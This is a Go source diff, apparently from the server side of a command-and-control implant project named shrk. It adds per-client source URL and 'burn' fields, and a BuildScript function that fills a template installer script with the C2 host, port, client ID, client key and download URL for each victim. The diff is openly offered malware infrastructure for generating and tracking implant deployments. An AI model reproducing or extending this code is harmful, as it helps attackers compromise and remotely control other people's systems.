@@ -1,12 +1,17 @@
 package database
 
 import (
+	"bufio"
+	"bytes"
 	"fmt"
 	"net"
+	"net/url"
+	"os"
 	"strconv"
 	"strings"
 	"time"
 
+	"github.com/ngn13/shrk/server/config"
 	"github.com/ngn13/shrk/server/joblist"
 	"github.com/ngn13/shrk/server/util"
 )
@@ -20,16 +25,81 @@ var (
 )
 
 type Client struct {
-	ID        string    `json:"id"`
-	Key       string    `json:"key"`
-	OS        string    `json:"os"`
-	IPs       []string  `json:"ips"`
-	Memory    uint64    `json:"memory"` // kb
-	Cores     uint64    `json:"cores"`
-	FirstCon  time.Time `json:"first_con"`
-	LastCon   time.Time `json:"last_con"`
-	HasInfo   bool      `json:"has_info"`
-	Connected bool      `json:"connected"`
+	ID         string    `json:"id"`
+	Key        string    `json:"key"`
+	OS         string    `json:"os"`
+	IPs        []string  `json:"ips"`
+	Memory     uint64    `json:"memory"` // kb
+	Cores      uint64    `json:"cores"`
+	FirstCon   time.Time `json:"first_con"`
+	LastCon    time.Time `json:"last_con"`
+	HasInfo    bool      `json:"has_info"`
+	Connected  bool      `json:"connected"`
+	SourceURL  string    `json:"source_url"`
+	ShouldBurn bool      `json:"should_burn"`
+	IsBurned   bool      `json:"is_burned"`
+}
+
+func (c *Client) BuildScript(conf *config.Type) (string, error) {
+	var (
+		sf          *os.File
+		scanner     *bufio.Scanner
+		source_url  string
+		script_line []byte
+		script      []byte
+		err         error
+	)
+
+	if source_url = c.SourceURL; source_url == "" {
+		if source_url, err = url.JoinPath(conf.HTTP_URL, conf.SourcePath); err != nil {
+			return "", err
+		}
+	}
+
+	if sf, err = os.Open(conf.Script); err != nil {
+		return "", err
+	}
+	defer sf.Close()
+
+	scanner = bufio.NewScanner(sf)
+	script = []byte{}
+
+	for scanner.Scan() {
+		// remove empty lines
+		if script_line = scanner.Bytes(); script_line == nil || len(script_line) == 0 {
+			continue
+		}
+
+		// remove comments
+		if script_line[0] == byte('#') {
+			continue
+		}
+
+		script = append(script, script_line...)
+		script = append(script, byte('\n'))
+	}
+
+	if err = scanner.Err(); err != nil {
+		return "", err
+	}
+
+	script = bytes.ReplaceAll(script, []byte("[SERVER_ADDR]"), []byte(conf.C2_URL_p.Hostname()))
+	script = bytes.ReplaceAll(script, []byte("[SERVER_PORT]"), []byte(conf.C2_URL_p.Port()))
+	script = bytes.ReplaceAll(script, []byte("[CLIENT_ID]"), []byte(c.ID))
+	script = bytes.ReplaceAll(script, []byte("[CLIENT_KEY]"), []byte(c.Key))
+	script = bytes.ReplaceAll(script, []byte("[SOURCE_URL]"), []byte(source_url))
+	script = bytes.ReplaceAll(script, []byte("[VERSION]"), []byte(conf.Version))
+	if conf.Debug {
+		script = bytes.ReplaceAll(script, []byte("[DEBUG]"), []byte("1"))
+	} else {
+		script = bytes.ReplaceAll(script, []byte("[DEBUG]"), []byte("0"))
+	}
+
+	return string(script), err
+}
+
+func (c *Client) ScriptPath() string {
+	return util.SHA1(c.ID)
 }
 
 func (c *Client) HumanMem() string {
